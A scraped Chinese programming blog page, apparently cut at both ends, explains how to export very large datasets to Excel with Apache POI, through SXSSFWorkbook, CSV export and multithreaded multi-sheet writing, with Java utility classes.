}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n\n * 线程类\n\npackage com.zpj.electric.util;\n\nimport org.apache.poi.hssf.usermodel.HSSFCellStyle;\nimport org.apache.poi.ss.usermodel.IndexedColors;\nimport org.apache.poi.ss.util.CellRangeAddress;\nimport org.apache.poi.xssf.usermodel.*;\n\nimport java.text.SimpleDateFormat;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.concurrent.CountDownLatch;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\n\npublic class PoiWriter implements Runnable {\n\n\tpublic int x;//第几个sheet页\n\tpublic XSSFWorkbook wb;//poi Workbook\n\tpublic String fileName;//要导出的文件名字(含后缀)\n\tpublic String[] titles;//标题\n\tpublic List<Object[]> data;//全部数据\n\tpublic List<List<Object[]>> dataList;//包含了各个sheet页的数据\n\tpublic boolean useFirstTitle;//是否需要表头\n\tpublic  CountDownLatch doneSignal;//多线程栅栏计步器\n\n\n\tpublic PoiWriter(int x, XSSFWorkbook wb, String fileName, String[] titles,\n\t\t\tList<Object[]> data, List<List<Object[]>> dataList,\n\t\t\tboolean useFirstTitle, CountDownLatch doneSignal) {\n\t\tsuper();\n\t\tthis.x = x;\n\t\tthis.wb = wb;\n\t\tthis.fileName = fileName;\n\t\tthis.titles = titles;\n\t\tthis.data = data;\n\t\tthis.dataList = dataList;\n\t\tthis.useFirstTitle = useFirstTitle;\n\t\tthis.doneSignal = doneSignal;\n\t}\n\n\tpublic PoiWriter() {\n\n\t}\n\n\t@Override\n\tpublic void run() {\n\t\tLong start1 = System.currentTimeMillis();\n\t\tSystem.out.println(fileName+"：第"+(x+1)+"个sheet开始时间：" + start1);\n\t\t// 创建一sheet页\n\t\tXSSFSheet sheet = wb.createSheet("sheet"+x);\n\t\t// 设置格式 在单元格中右排放\n\t\tXSSFCellStyle style = wb.createCellStyle();\n\t\tstyle.setAlignment(XSSFCellStyle.ALIGN_RIGHT);\n\n\t\tint firstRow = 0;\n\t\tif (useFirstTitle) {\n\t\t\tXSSFRow fr = sheet.createRow(firstRow);\n\t\t\tXSSFFont font = wb.createFont();\n\t\t\tfont.setFontName("宋体");\n\t\t\tfont.setFontHeightInPoints((short) 16);\n\t\t\tXSSFCellStyle cs = wb.createCellStyle();\n\t\t\tcs.setAlignment(XSSFCellStyle.ALIGN_CENTER);\n\t\t\tcs.setVerticalAlignment(XSSFCellStyle.VERTICAL_CENTER);\n\t\t\tcs.setFont(font);\n\t\t\tfr.setHeight((short) 700);\n\t\t\tfr.setHeight((short) 700);\n\t\t\t//excel大标题和并列多了一列，当列表中数据为空时，导出的excel中加上标题等信息\n\t\t\tsheet.addMergedRegion(new CellRangeAddress(0, 0, 0,\n\t\t\t\t\ttitles.length-1));\n\t\t\tfor (int i = 0; i < titles.length; i++) {\n\t\t\t\tfr.createCell(i);\n\t\t\t}\n\t\t\t/**\n\t\t\t * 自适应宽度\n\t\t\t */\n\t\t\tif(null!=data&&data.size()>0){\n\t\t\t\tObject[] obj=data.get(0);\n\t\t\t\tif(obj.length==titles.length){\n\t\t\t\t\tfor(int i=0;i<titles.length;i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tint contentLength=titles[i].length();\n\t\t\t\t\t\tif(null!=obj[i]&&obj[i].toString().length()>titles[i].length()){\n\t\t\t\t\t\t\tcontentLength=obj[i].toString().length();\n\t\t\t\t\t\t}\n\t\t\t\t\t\tif(i==0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\t//The maximum column width for an individual cell is 255 characters. 的解决方案\n\t\t\t\t\t\t\tif((short)50*(50+contentLength)/256>255){\n\t\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)254*256);  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)50*(50+contentLength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t//The maximum column width for an individual cell is 255 characters. 的解决方案\n\t\t\t\t\t\t\tif((short)100*(55+contentLength)/256>255){\n\t\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)254*256);  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)100*(55+contentLength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t\t}\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t}else{\n\t\t\t\t\tfor(int i=0;i<titles.length;i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tint contentLength=titles[i].length();\n\t\t\t\t\t\tif(i==0)\n\t\t\t\t\t\t{\n\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)50*(50+contentLength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t}else{\n\t\t\t\t\t\t\tsheet.setColumnWidth(i, (short)100*(55+contentLength));  //初始列宽+自适应宽度\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\n\t\t\t\t}\n\n\t\t\t}\n\n\t\t\t//创建新的样式给列表的大标题加上背景色\n\t\t\t XSSFCellStyle alignStyle = (XSSFCellStyle)wb.createCellStyle();\n\t\t\t alignStyle.setAlignment(XSSFCellStyle.ALIGN_CENTER);\n\t\t\t alignStyle.setVerticalAlignment(XSSFCellStyle.VERTICAL_CENTER);\n\t\t\t alignStyle.setFillPattern(HSSFCellStyle.SOLID_FOREGROUND);\n\t\t\t alignStyle.setFillForegroundColor(IndexedColors.SKY_BLUE.getIndex());\n\t\t\t alignStyle.setFont(font);\n\t\t\tfr.getCell(0).setCellValue(new XSSFRichTextString(fileName));\n\t\t\tfr.getCell(0).setCellStyle(alignStyle);\n\t\t\tfirstRow += 1;\n\t\t}\n\n\t\tXSSFRow row = sheet.createRow(firstRow);\n\t\tfor (int i = 0; i < titles.length; i++) {\n\t\t\trow.createCell(i).setCellValue(new XSSFRichTextString(titles[i]));\n\t\t}\n\n\n\t\t\tfor (int i = 0; i < dataList.get(x).size(); i++) {\n\t\t\t\tXSSFRow r = sheet.createRow(i + firstRow + 1);\n\t\t\t\tObject[] obj = dataList.get(x).get(i);\n\t\t\t\tfor (int j = 0; j < obj.length; j++) {\n\t\t\t\t\t// 创建单元格\n\t\t\t\t\tXSSFCell cell = r.createCell(j);\n\t\t\t\t\tObject value = obj[j];\n\t\t\t\t\t// 判断值的类型后进行强制类型转换\n\t\t\t\t\tString textValue = null;\n\t\t\t\t\tif (value instanceof Date) {\n\t\t\t\t\t\tDate date = (Date) value;\n\t\t\t\t\t\tSimpleDateFormat sdf = new SimpleDateFormat(\n\t\t\t\t\t\t\t\t"yy-MM-dd HH:mm:ss");\n\t\t\t\t\t\ttextValue = sdf.format(date);\n\t\t\t\t\t} else if (value instanceof byte[]) {\n\t\t\t\t\t\t// 有图片时，设置行高为60px;\n\n\t\t\t\t\t} else {\n\t\t\t\t\t\tif (value == null) {\n\t\t\t\t\t\t\t// 如果值为空，什么都不做\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\t// 其它数据类型都当作字符串简单处理\n\t\t\t\t\t\t\ttextValue = value.toString();\n\t\t\t\t\t\t}\n\t\t\t\t\t}\n\t\t\t\t\t// 如果不是图片数据，就利用正则表达式判断textValue是否全部由数字组成\n\t\t\t\t\tif (textValue != null) {\n\t\t\t\t\t\tPattern p = Pattern.compile("^//d+(//.//d+)?$");\n\t\t\t\t\t\tMatcher matcher = p.matcher(textValue);\n\t\t\t\t\t\tif (matcher.matches()) {\n\t\t\t\t\t\t\t// 是数字当作double处理\n\t\t\t\t\t\t\tcell.setCellValue(Double.parseDouble(textValue));\n\t\t\t\t\t\t} else {\n\t\t\t\t\t\t\tXSSFRichTextString richString = new XSSFRichTextString(\n\t\t\t\t\t\t\t\t\ttextValue);\n\t\t\t\t\t\t\tcell.setCellValue(richString);\n\t\t\t\t\t\t}\n\t\t\t\t\t} else {// 若果是空值，单元格显示为空\n\t\t\t\t\t\tcell.setCellValue(new XSSFRichTextString(""));\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\n\t\t\tLong end1 = System.currentTimeMillis();\n\t\t\tSystem.out.println("第"+(x+1)+"个sheet总计时间：" +((end1-start1)/1000) + "s");\n\t\t\tif(doneSignal!=null){\n\t\t\t\tdoneSignal.countDown(); // 线程计数-1\n\t\t\t\tSystem.out.println("第" + (x+1) + "个sheet创建完成，" + "计数器减1");\n\t\t\t}\n\t}\n\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n',normalizedContent:'因项目特殊，最近遇到了excel导出大数据量的问题，所以就趁着解决这个问题的机会，把poi导出excel再整理一遍，方便自己日后总结。\n\n\n\n * 概要\n * 问题原因\n * 解决办法：\n   * 1. 调整jvm/tomcat大小\n   * 2. 通过新版的sxssfworkbook来解决\n   * 3. 转csv导出\n   * 4. 本地90万数据：输入输出流+poi多线程多sheet导出excel\n   * 5. 浏览器：多线程多sheet页下载\n\n\n\n\n# 概要\n\nexcel：poi 多线程多sheet导出数据\n\n * excel2003版最大行数是65536，excel2007最大行数是1048576\n * excel2003版最大列数是256，excel2007最大列数是16384\n\n\n# 问题原因\n\n 1. 导出大数据量，可能遇到的第一个问题就是后台报：java.lang.outofmemoryerror: java heap space 内存溢出这个问题\n    \n    > 分析：poi导出时，会先把内容写到内存中，最后浏览器从内存中下载，但是数据量太大，会导致内存溢出\n\n\n# 解决办法：\n\n\n# 1. 调整jvm/tomcat大小\n\n * 设置jvm：-xms64m -xmx512m（依据你物理内存的大小调整）\n   \n   > 祥见：https://www.cnblogs.com/jhcelue/p/6900881.html\n\n\n# 2. 通过新版的sxssfworkbook来解决\n\n * 自poi3.8以后，可通过新版的sxssfworkbook来解决，可通过其构造函数指定在内存中缓存的行数，内存中指定行数满足时会自动缓存在硬盘的临时目录上然后循环下一次，同时，并不会存在页面卡顿的情况；\n   \n   > java使用poi如何导出百万级别数据：\n   > \n   > https://www.cnblogs.com/520playboy/p/6275170.html\n   > \n   > https://fanshuyao.iteye.com/blog/2426095\n\n\n# 3. 转csv导出\n\n * csv是一种通用的、相对简单的文件格式，其文件以纯文本形式存储表格数据（数字和文本）。\n * excel和csv格式文件的不同之处 => 传送门\n\n> 手写一个 csv，可先直接运行main()查看结果\n\npackage com.zpj.electric.utils;\n\nimport java.io.bufferedwriter;\nimport java.io.file;\nimport java.io.fileinputstream;\nimport java.io.filenotfoundexception;\nimport java.io.fileoutputstream;\nimport java.io.ioexception;\nimport java.io.inputstream;\nimport java.io.outputstream;\nimport java.io.outputstreamwriter;\nimport java.net.urlencoder;\nimport java.util.arraylist;\nimport java.util.iterator;\nimport java.util.linkedhashmap;\nimport java.util.list;\nimport java.util.map;\n\nimport javax.servlet.http.httpservletresponse;\n\nimport com.alibaba.druid.util.stringutils;\n\n/**\n * @classname: csvutils\n * @date: 2018/7/16\n * @version: 1.0\n */\n\npublic class csvutils {\n\n\n    /**\n     * 功能说明：获取utf-8编码文本文件开头的bom签名。\n     * bom(byte order mark)，是utf编码方案里用于标识编码的标准标记。例：接收者收到以ef bb bf开头的字节流，就知道是utf-8编码。\n     * @return utf-8编码文本文件开头的bom签名\n     */\n    public static string getbom() {\n\n        byte b[] = {(byte)0xef, (byte)0xbb, (byte)0xbf};\n        return new string(b);\n    }\n\n    /**\n     * 生成cvs文件\n     * @param exportdata\n     *       源数据list\n     * @param map\n     *       csv文件的列表头map\n     * @param outputpath\n     *       文件路径\n     * @param filename\n     *       文件名称\n     * @return\n     */\n    @suppresswarnings("rawtypes")\n    public static file createcsvfile(list exportdata, linkedhashmap map, string outputpath,\n                                     string filename) {\n        file csvfile = null;\n        bufferedwriter csvfileoutputstream = null;\n        try {\n            file file = new file(outputpath);\n            if (!file.exists()) {\n                file.mkdirs();\n            }\n            //定义文件名格式并创建\n            csvfile =new file(outputpath+filename+".csv");\n            file.createnewfile();\n            // utf-8使正确读取分隔符","\n            //如果生产文件乱码，windows下用gbk，linux用utf-8\n            csvfileoutputstream = new bufferedwriter(new outputstreamwriter(new fileoutputstream(\n                    csvfile), "utf-8"), 1024);\n\n            //写入前段字节流，防止乱码\n            csvfileoutputstream.write(getbom());\n            // 写入文件头部\n            for (iterator propertyiterator = map.entryset().iterator(); propertyiterator.hasnext();) {\n                java.util.map.entry propertyentry = (java.util.map.entry) propertyiterator.next();\n                csvfileoutputstream.write((string) propertyentry.getvalue() != null ? (string) propertyentry.getvalue() : "" );\n                if (propertyiterator.hasnext()) {\n                    csvfileoutputstream.write(",");\n                }\n            }\n            csvfileoutputstream.newline();\n            // 写入文件内容\n            for (iterator iterator = exportdata.iterator(); iterator.hasnext();) {\n                object row = (object) iterator.next();\n                for (iterator propertyiterator = map.entryset().iterator(); propertyiterator\n                        .hasnext();) {\n                    java.util.map.entry propertyentry = (java.util.map.entry) propertyiterator\n                            .next();\n                    string str=row!=null?((string)((map)row).get( propertyentry.getkey())):"";\n\n                    if(stringutils.isempty(str)){\n                        str="";\n                    }else{\n                        str=str.replaceall("\\"","\\"\\"");\n                        if(str.indexof(",")>=0){\n                            str="\\""+str+"\\"";\n                        }\n                    }\n                    csvfileoutputstream.write(str);\n                    if (propertyiterator.hasnext()) {\n                        csvfileoutputstream.write(",");\n                    }\n                }\n                if (iterator.hasnext()) {\n                    csvfileoutputstream.newline();\n                }\n            }\n            csvfileoutputstream.flush();\n        } catch (exception e) {\n            e.printstacktrace();\n        } finally {\n            try {\n                csvfileoutputstream.close();\n            } catch (ioexception e) {\n                e.printstacktrace();\n            }\n        }\n        return csvfile;\n    }\n\n    /**\n     *     生成并下载csv文件\n     * @param response\n     * @param exportdata\n     * @param map\n     * @param outputpath\n     * @param filename\n     * @throws ioexception\n     */\n    @suppresswarnings("rawtypes")\n    public static void exportdatafile(httpservletresponse response,list exportdata, linkedhashmap map, string outputpath,string filename) throws ioexception{\n        file csvfile = null;\n        bufferedwriter csvfileoutputstream = null;\n        try {\n            file file = new file(outputpath);\n            if (!file.exists()) {\n                file.mkdirs();\n            }\n            //定义文件名格式并创建\n            csvfile =new file(outputpath+filename+".csv");\n            if(csvfile.exists()){\n                csvfile.delete();\n            }\n            csvfile.createnewfile();\n            // utf-8使正确读取分隔符","\n            //如果生产文件乱码，windows下用gbk，linux用utf-8\n            csvfileoutputstream = new bufferedwriter(new outputstreamwriter(new fileoutputstream(csvfile), "utf-8"), 1024);\n            //写入前段字节流，防止乱码\n            csvfileoutputstream.write(getbom());\n            // 写入文件头部\n            for (iterator propertyiterator = map.entryset().iterator(); propertyiterator.hasnext();) {\n                java.util.map.entry propertyentry = (java.util.map.entry) propertyiterator.next();\n                csvfileoutputstream.write((string) propertyentry.getvalue() != null ? (string) propertyentry.getvalue() : "" );\n                if (propertyiterator.hasnext()) {\n                    csvfileoutputstream.write(",");\n                }\n            }\n            csvfileoutputstream.newline();\n            // 写入文件内容\n            for (iterator iterator = exportdata.iterator(); iterator.hasnext();) {\n                object row = (object) iterator.next();\n                for (iterator propertyiterator = map.entryset().iterator(); propertyiterator\n                        .hasnext();) {\n                    java.util.map.entry propertyentry = (java.util.map.entry) propertyiterator\n                            .next();\n                    string str=row!=null?((string)((map)row).get( propertyentry.getkey())):"";\n                    if(stringutils.isempty(str)){\n                        str="";\n                    }else{\n                        str=str.replaceall("\\"","\\"\\"");\n                        if(str.indexof(",")>=0){\n                            str="\\""+str+"\\"";\n                        }\n                    }\n                    csvfileoutputstream.write(str);\n                    if (propertyiterator.hasnext()) {\n                        csvfileoutputstream.write(",");\n                    }\n                }\n                if (iterator.hasnext()) {\n                    csvfileoutputstream.newline();\n                }\n            }\n            csvfileoutputstream.flush();\n        } catch (exception e) {\n            e.printstacktrace();\n        } finally {\n            try {\n                csvfileoutputstream.close();\n            } catch (ioexception e) {\n                e.printstacktrace();\n            }\n        }\n\n\n\n\n        inputstream in = null;\n        try {\n            in = new fileinputstream(outputpath+filename+".csv");\n            int len = 0;\n            byte[] buffer = new byte[1024];\n\n            outputstream out = response.getoutputstream();\n            response.reset();\n\n            response.setcontenttype("application/csv;charset=utf-8");\n            response.setheader("content-disposition","attachment; filename=" + urlencoder.encode(filename+".csv", "utf-8"));\n            response.setcharacterencoding("utf-8");\n            while ((len = in.read(buffer)) > 0) {\n                out.write(new byte[] { (byte) 0xef, (byte) 0xbb, (byte) 0xbf });\n                out.write(buffer, 0, len);\n            }\n            out.close();\n        } catch (filenotfoundexception e) {\n        } finally {\n            if (in != null) {\n                try {\n                    in.close();\n                } catch (exception e) {\n                    throw new runtimeexception(e);\n                }\n            }\n        }\n\n    }\n\n    /**\n     * 删除该目录filepath下的所有文件\n     * @param filepath\n     *      文件目录路径\n     */\n    public static void deletefiles(string filepath) {\n        file file = new file(filepath);\n        if (file.exists()) {\n            file[] files = file.listfiles();\n            for (int i = 0; i < files.length; i++) {\n                if (files[i].isfile()) {\n                    files[i].delete();\n                }\n            }\n        }\n    }\n\n    /**\n     * 删除单个文件\n     * @param filepath\n     *     文件目录路径\n     * @param filename\n     *     文件名称\n     */\n    public static void deletefile(string filepath, string filename) {\n        file file = new file(filepath);\n        if (file.exists()) {\n            file[] files = file.listfiles();\n            for (int i = 0; i < files.length; i++) {\n                if (files[i].isfile()) {\n                    if (files[i].getname().equals(filename)) {\n                        files[i].delete();\n                        return;\n                    }\n                }\n            }\n        }\n    }\n\n    /**\n     * 测试数据\n     * @param args\n     */\n    @suppresswarnings({ "rawtypes", "unchecked" })\n    public static void main(string[] args) {\n        list exportdata = new arraylist<map>();\n        map row1 = new linkedhashmap<string, string>();\n        row1.put("1", "11");\n        row1.put("2", "12");\n        row1.put("3", "13");\n        row1.put("4", "14");\n        exportdata.add(row1);\n        row1 = new linkedhashmap<string, string>();\n        row1.put("1", "21");\n        row1.put("2", "22");\n        row1.put("3", "23");\n        row1.put("4", "24");\n        exportdata.add(row1);\n        linkedhashmap map = new linkedhashmap();\n\n        //设置列名\n        map.put("1", "第一列名称");\n        map.put("2", "第二列名称");\n        map.put("3", "第三列名称");\n        map.put("4", "第四列名称");\n        //这个文件上传到路径，可以配置在数据库从数据库读取，这样方便一些！\n        string path = "e:/";\n\n        //文件名=生产的文件名称+时间戳\n        string filename = "文件导出";\n        file file = csvutils.createcsvfile(exportdata, map, path, filename);\n        string filename2 = file.getname();\n        system.out.println("文件名称：" + filename2);\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n111\n112\n113\n114\n115\n116\n117\n118\n119\n120\n121\n122\n123\n124\n125\n126\n127\n128\n129\n130\n131\n132\n133\n134\n135\n136\n137\n138\n139\n140\n141\n142\n143\n144\n145\n146\n147\n148\n149\n150\n151\n152\n153\n154\n155\n156\n157\n158\n159\n160\n161\n162\n163\n164\n165\n166\n167\n168\n169\n170\n171\n172\n173\n174\n175\n176\n177\n178\n179\n180\n181\n182\n183\n184\n185\n186\n187\n188\n189\n190\n191\n192\n193\n194\n195\n196\n197\n198\n199\n200\n201\n202\n203\n204\n205\n206\n207\n208\n209\n210\n211\n212\n213\n214\n215\n216\n217\n218\n219\n220\n221\n222\n223\n224\n225\n226\n227\n228\n229\n230\n231\n232\n233\n234\n235\n236\n237\n238\n239\n240\n241\n242\n243\n244\n245\n246\n247\n248\n249\n250\n251\n252\n253\n254\n255\n256\n257\n258\n259\n260\n261\n262\n263\n264\n265\n266\n267\n268\n269\n270\n271\n272\n273\n274\n275\n276\n277\n278\n279\n280\n281\n282\n283\n284\n285\n286\n287\n288\n289\n290\n291\n292\n293\n294\n295\n296\n297\n298\n299\n300\n301\n302\n303\n304\n\n\n\n# 4. 本地90万数据：输入输出流+poi多线程多sheet导出excel\n\n> 可直接运行main()查看导出结果，注意poi版本3.7+\n\npackage com.zpj.electric.util.excel;\n\nimport com.zpj.electric.po.student;\nimport org.apache.commons.beanutils.propertyutilsbean;\nimport org.apache.commons.lang3.stringutils;\nimport org.apache.poi.ss.usermodel.row;\nimport org.apache.poi.ss.usermodel.sheet;\nimport org.apache.poi.ss.usermodel.workbook;\nimport org.apache.poi.xssf.streaming.sxssfworkbook;\n\nimport java.beans.propertydescriptor;\nimport java.io.file;\nimport java.io.fileoutputstream;\nimport java.io.ioexception;\nimport java.text.simpledateformat;\nimport java.util.*;\nimport java.util.concurrent.countdownlatch;\nimport java.util.concurrent.linkedblockingqueue;\nimport java.util.concurrent.threadpoolexecutor;\nimport java.util.concurrent.timeunit;\n\npublic class threadexcelutils {\n\n    /**\n     * 定义没个 sheet 最多数量\n     */\n    public static final integer excel_max_cnt = 50000;\n\n    private workbook wb;\n\n    private string filename;\n\n    private string filepath;\n\n    private string[] hearders;\n\n    private string[] fields;\n\n    public workbook getwb() {\n        return wb;\n    }\n\n    public string getfilename() {\n        return filename;\n    }\n\n    public string getfilepath() {\n        return filepath;\n    }\n\n    public string[] gethearders() {\n        return hearders;\n    }\n\n    public string[] getfields() {\n        return fields;\n    }\n\n    /**\n     * @param filename 文件名称\n     * @param filepath 文件路径\n     * @param hearders 文件头\n     * @param fields   字段属性\n     * @author maochuang.li\n     * @date create in 13:54 2017/12/28 0028\n     */\n    public threadexcelutils(string filename, string filepath, string[] hearders, string[] fields) {\n        this.wb = new sxssfworkbook(10000);\n        this.filename = filename;\n        this.filepath = filepath;\n        this.hearders = hearders;\n        this.fields = fields;\n    }\n\n    public static void main(string[] args) throws exception {\n        string[] header = {"姓名", "年龄"};\n        string[] filenames = {"name", "age"};\n        threadexcelutils utils = new threadexcelutils("测试excel1", "d:\\\\exceltext\\\\wer\\\\sd", header, filenames);\n        list list = new arraylist<>();\n        system.out.println("开始造数据.......");\n        for (int i = 0; i < 900000; i++) {\n            student student = new student();\n            student.setname("name->" + i);\n            student.setage(i);\n            list.add(student);\n        }\n        system.out.println(getdate(new date()) + "开始写入文件.......");\n        long starttime = system.currenttimemillis();\n        utils.exportexceltofilepath(list);\n        long endtime = system.currenttimemillis();\n        system.out.println("耗时：" + (endtime - starttime));\n        //耗时：29230\n        //耗时：25226\n\n    }\n\n    /**\n     * @param list 数据\n     * @author maochuang.li\n     * @date create in 10:52 2017/12/28 0028\n     */\n    public void exportexceltofilepath(list<object> list) throws exception {\n        int excelsize = excel_max_cnt;    //每个excel文件条数\n        int totalcount = list.size();    //查询结果总条数\n        int pagecount = 0;//总sheet页个数\n        int numpage = totalcount % excelsize;    //是否整页数\n        if (numpage > 0)\n            pagecount = totalcount / excelsize + 1;\n        else\n            pagecount = totalcount / excelsize;\n        //创建线程池 多sheet多线程写入 线程数 为sheet页的 1/4\n        integer threadnumber = pagecount / 4;\n        if (threadnumber == 0)\n            threadnumber = 1;\n//        executorservice threadpool = executors.newfixedthreadpool(threadnumber);\n        threadpoolexecutor threadpool = new threadpoolexecutor(threadnumber, threadnumber, 0l, timeunit.seconds, new linkedblockingqueue<>(50));\n        //创建栅栏 等待任务完成\n        countdownlatch countdownlatch = new countdownlatch(pagecount);\n        //循环遍历投递任务\n        for (int i = 1; i <= pagecount; i++) {\n            thraedexcel thraedexcel = new thraedexcel(list, i, pagecount, numpage, this);\n            thraedexcel.setcountdownlatch(countdownlatch);\n            threadpool.submit(thraedexcel);\n        }\n        countdownlatch.await(10l,timeunit.seconds);\n        system.err.println("超时拉=====================================");\n        workbook wb = getwb();\n        file file = new file(filepath);\n        if (!file.exists() && !file.isdirectory()) {\n            file.mkdirs();\n        }\n        fileoutputstream fout = new fileoutputstream(new file(file, filename + ".xls"));\n        try {\n            wb.write(fout);\n        } catch (ioexception e) {\n            e.printstacktrace();\n        }\n        system.out.println("文件写入完成");\n        //立即销毁线程池\n        threadpool.shutdownnow();\n    }\n\n\n    private static string getdate(date date) {\n        simpledateformat simpledateformat = new simpledateformat("yyyy-mm-dd hh:mm:ss");\n        string format = simpledateformat.format(date);\n        return format;\n    }\n\n    /**\n     * javabean转map\n     *\n     * @param obj\n     * @return\n     */\n    public static map<string, object> beantomap(object obj) {\n        map<string, object> params = new hashmap<string, object>(0);\n        try {\n            propertyutilsbean propertyutilsbean = new propertyutilsbean();\n            propertydescriptor[] descriptors = propertyutilsbean.getpropertydescriptors(obj);\n            int length = descriptors.length;\n            for (int i = 0; i < length; i++) {\n                string name = descriptors[i].getname();\n                if (!stringutils.equals(name, "class")) {\n                    params.put(name, propertyutilsbean.getnestedproperty(obj, name));\n                }\n            }\n        } catch (exception e) {\n            system.err.println("bean 转map出错");\n            e.printstacktrace();\n        }\n        return params;\n    }\n\n    /***\n     * 线程写入sheet\n     */\n    private static class thraedexcel implements runnable {\n\n        private list<object> list;//数据\n\n        private integer sheetnumber;//当前sheet页\n\n        private integer totalsheetcount;//总数据\n\n        private int numpage;    //是否整页数\n\n        private integer excelsize;\n\n        private threadexcelutils threadexcelutils;\n        //栅栏对象\n        private countdownlatch countdownlatch;\n\n        /**\n         * @param list            总数据\n         * @param sheetnumber     当前sheet页\n         * @param totalsheetcount 总sheet页\n         * @param numpage         是否整数\n         * @author maochuang.li\n         * @date create in 11:12 2017/12/28 0028\n         */\n        public thraedexcel(list<object> list, integer sheetnumber, integer totalsheetcount, integer numpage, threadexcelutils threadexcelutils) {\n            this.list = list;//总数据\n            this.sheetnumber = sheetnumber;//当前sheet页\n            this.totalsheetcount = totalsheetcount;//总sheet页\n            this.numpage = numpage;//是否整除\n            this.excelsize = threadexcelutils.excel_max_cnt;//没个sheet最大数量\n            this.threadexcelutils = threadexcelutils;//当前线程对象\n        }\n\n        public void setcountdownlatch(countdownlatch countdownlatch) {\n            this.countdownlatch = countdownlatch;\n        }\n\n        @override\n        public void run() {\n            system.out.println("第"+sheetnumber+"个sheet开始");\n            list<object> sheetlist = null;\n            if (totalsheetcount > 1) {\n                if (numpage == 0) {\n                    sheetlist = list.sublist((sheetnumber - 1) * excelsize, excelsize * sheetnumber);\n                } else {\n                    if (sheetnumber == totalsheetcount) {\n                        sheetlist = list.sublist((sheetnumber - 1) * excelsize, list.size());\n                    } else {\n                        sheetlist = list.sublist((sheetnumber - 1) * excelsize, excelsize * (sheetnumber));\n                    }\n                }\n            } else\n                sheetlist = list;\n            //开始写入数据\n            createworkbook(sheetlist);\n            if (this.countdownlatch != null)\n                this.countdownlatch.countdown();\n            system.out.println("第"+sheetnumber+"个sheet  结束");\n        }\n\n        /***\n         * 写出数据\n         */\n        private void createworkbook(list<object> sheetlist) {\n            sheet sheet = null;\n            row row = null;\n            synchronized (threadexcelutils.class) {\n                string filename = threadexcelutils.getfilename();\n                workbook wb = threadexcelutils.getwb();\n                sheet = wb.createsheet(filename + "_" + this.sheetnumber);\n                row = sheet.createrow(0);\n            }\n            string[] header = threadexcelutils.gethearders();\n            string[] fields = threadexcelutils.getfields();\n            //设置标题\n            for (int i = 0; i < header.length; i++) {\n                row.createcell(i).setcellvalue(header[i]);\n            }\n            //开始写入数据\n            if (sheetlist != null && sheetlist.size() > 0) {\n                int datalength = sheetlist.size();\n                for (int i = 0; i < datalength; i++) {\n                    row row1 = sheet.createrow(i + 1);\n                    object obj = sheetlist.get(i);\n                    map<string, object> map = (obj instanceof map) ? (map<string, object>) obj : beantomap(obj);\n                    int length = fields.length;\n                    for (int j = 0; j < length; j++) {\n                        string key = fields[j];\n  